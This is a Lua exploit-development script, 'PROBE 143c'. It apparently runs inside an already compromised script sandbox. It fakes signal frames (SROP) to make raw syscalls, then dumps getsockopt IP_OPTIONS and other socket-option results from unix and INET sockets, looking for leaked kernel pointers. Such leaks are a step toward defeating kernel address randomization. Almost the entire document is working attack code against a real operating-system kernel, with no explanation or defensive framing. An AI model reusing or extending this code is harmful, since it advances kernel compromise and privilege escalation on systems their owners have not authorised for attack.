-- CRASH_CLASS: LOW
-- PROBE 143c: Dump IP_OPTIONS 88-byte return for kernel pointer leak
-- 143b showed getsockopt(IP_OPTIONS) returns 88 bytes on unix socket.
-- This might be uninitialized kernel stack/heap data.

print("=== PROBE 143c: IP_OPTIONS DUMP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

--------------------------------------------------------------------
-- [A] IP_OPTIONS on unix domain socket — full 88-byte dump
--------------------------------------------------------------------
print("--- [A] Unix socket IP_OPTIONS ---")

local sp = gpu + 0x1000
wd(sp, 0xDEAD); wd(sp + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp))
local fd_a = safe_rd(sp) or 0
print("[A] unix sock=" .. fd_a)

local optbuf = gpu + 0x2000
local optlen_p = gpu + 0x2200

-- Fill buffer with sentinel
for off = 0, 0xFF, 4 do wd(optbuf + off, 0xBBBBBBBB) end
wd(optlen_p, 256)

-- getsockopt(fd, IPPROTO_IP=0, IP_OPTIONS=1, buf, &len)
local rv = srop(118, uint64(fd_a), uint64(0), uint64(1),
                ua(optbuf), ua(optlen_p))
local rh, rl = get_hi_lo(rv)
local olen = safe_rd(optlen_p) or 0
print("[A] IP_OPTIONS ret=" .. rl .. " len=" .. olen)

if rl == 0 and olen > 0 then
    print("[A] Full dump (" .. olen .. " bytes):")
    local found_kptr = false
    for off = 0, math.min(olen - 1, 127), 4 do
        local v = safe_rd(optbuf + off) or 0
        print("[A] +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
    end
    for off = 0, math.min(olen - 1, 127), 8 do
        local q = safe_rq(optbuf + off)
        if q then
            local qh, ql = get_hi_lo(q)
            if qh >= 0xFFFF8000 then
                print("[A] *** KERNEL PTR at +" .. string.format("%02X", off) .. "=" .. hex(q) .. " ***")
                found_kptr = true
            end
        end
    end
    if not found_kptr then print("[A] No kernel ptrs in IP_OPTIONS") end
end

--------------------------------------------------------------------
-- [B] Same test on INET socket (AF_INET=2, SOCK_STREAM=1)
--------------------------------------------------------------------
print("")
print("--- [B] INET socket IP_OPTIONS ---")

-- Create INET socket via SROP: socket(AF_INET=2, SOCK_STREAM=1, 0)
local rv_is = srop(97, uint64(2), uint64(1), uint64(0))
local ish, isl = get_hi_lo(rv_is)
print("[B] inet sock=" .. isl)

if isl < 256 and ish == 0 then
    for off = 0, 0xFF, 4 do wd(optbuf + off, 0xCCCCCCCC) end
    wd(optlen_p, 256)

    rv = srop(118, uint64(isl), uint64(0), uint64(1),
              ua(optbuf), ua(optlen_p))
    rh, rl = get_hi_lo(rv)
    olen = safe_rd(optlen_p) or 0
    print("[B] IP_OPTIONS ret=" .. rl .. " len=" .. olen)

    if rl == 0 and olen > 0 then
        for off = 0, math.min(olen - 1, 127), 4 do
            local v = safe_rd(optbuf + off) or 0
            print("[B] +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
        end
        for off = 0, math.min(olen - 1, 127), 8 do
            local q = safe_rq(optbuf + off)
            if q then
                local qh, ql = get_hi_lo(q)
                if qh >= 0xFFFF8000 then
                    print("[B] *** INET KPTR +" .. string.format("%02X", off) .. "=" .. hex(q) .. " ***")
                end
            end
        end
    end
    srop(6, uint64(isl))
end

--------------------------------------------------------------------
-- [C] Try SO_LABEL on unix socket
--------------------------------------------------------------------
print("")
print("--- [C] SO_LABEL ---")

for off = 0, 0xFF, 4 do wd(optbuf + off, 0xDDDDDDDD) end
wd(optlen_p, 256)
rv = srop(118, uint64(fd_a), uint64(0xFFFF), uint64(0x1009),
          ua(optbuf), ua(optlen_p))
rh, rl = get_hi_lo(rv)
olen = safe_rd(optlen_p) or 0
print("[C] SO_LABEL ret=" .. rl .. " len=" .. olen)
if rl == 0 and olen > 0 then
    for off = 0, math.min(olen - 1, 63), 4 do
        local v = safe_rd(optbuf + off) or 0
        if v ~= 0 then
            print("[C] +" .. string.format("%02X", off) .. " = 0x" .. string.format("%08X", v))
        end
    end
end

--------------------------------------------------------------------
-- [D] Multiple IP_OPTIONS calls — check for varying data
-- If data changes between calls, it's likely kernel stack residue
--------------------------------------------------------------------
print("")
print("--- [D] IP_OPTIONS stability ---")

local prev_vals = {}
for round = 1, 5 do
    -- Create fresh socket each time
    local sp2 = gpu + 0x3000
    wd(sp2, 0xDEAD); wd(sp2 + 4, 0xDEAD)
    srop(135, uint64(1), uint64(1), uint64(0), ua(sp2))
    local fd2 = safe_rd(sp2) or 0

    for off = 0, 0xFF, 4 do wd(optbuf + off, 0) end
    wd(optlen_p, 256)

    rv = srop(118, uint64(fd2), uint64(0), uint64(1),
              ua(optbuf), ua(optlen_p))
    rh, rl = get_hi_lo(rv)
    olen = safe_rd(optlen_p) or 0

    if rl == 0 and olen > 0 then
        local vals = {}
        for off = 0, math.min(olen - 1, 87), 4 do
            vals[off] = safe_rd(optbuf + off) or 0
        end

        -- Check if values changed from previous round
        if round > 1 then
            local changed = false
            for off, v in pairs(vals) do
                if prev_vals[off] and prev_vals[off] ~= v then
                    changed = true
                    print("[D] round " .. round .. " +" .. string.format("%02X", off) ..
                          ": 0x" .. string.format("%08X", prev_vals[off]) ..
                          " -> 0x" .. string.format("%08X", v))
                end
            end
            if not changed then
                print("[D] round " .. round .. ": same as previous")
            end
        end
        prev_vals = vals
    end

    srop(6, uint64(fd2))
end

--------------------------------------------------------------------
-- [E] Other potentially leaky sockopt
--------------------------------------------------------------------
print("")
print("--- [E] Other sockopts ---")

local extra_opts = {
    {0xFFFF, 0x100A, "SO_PEERLABEL"},
    {0xFFFF, 0x1011, "SO_PROTOCOL"},
    {0xFFFF, 0x1015, "SO_DOMAIN"},
    {6, 0x01, "TCP_NODELAY"},      -- IPPROTO_TCP=6
    {6, 0x20, "TCP_INFO"},          -- TCP_INFO=0x20
    {0, 0x04, "IP_HDRINCL"},
    {0, 0x0D, "IP_RECVDSTADDR"},
    {0, 0x1B, "IP_RECVIF"},
    {0, 0x09, "IP_MULTICAST_TTL"},
}

-- Fresh unix socket
local sp3 = gpu + 0x4000
wd(sp3, 0xDEAD); wd(sp3 + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp3))
local fd3 = safe_rd(sp3) or 0

for _, opt in ipairs(extra_opts) do
    for off = 0, 0xFF, 4 do wd(optbuf + off, 0) end
    wd(optlen_p, 256)
    rv = srop(118, uint64(fd3), uint64(opt[1]), uint64(opt[2]),
              ua(optbuf), ua(optlen_p))
    rh, rl = get_hi_lo(rv)
    olen = safe_rd(optlen_p) or 0
    if rl == 0 and olen > 4 then
        print("[E] " .. opt[3] .. " len=" .. olen)
        for off = 0, math.min(olen - 1, 63), 8 do
            local q = safe_rq(optbuf + off)
            if q then
                local qh, ql = get_hi_lo(q)
                if qh >= 0xFFFF8000 then
                    print("[E] *** KPTR " .. opt[3] .. " +" .. string.format("%02X", off) .. "=" .. hex(q))
                end
            end
        end
    end
end

print("")
print("=== DONE ===")
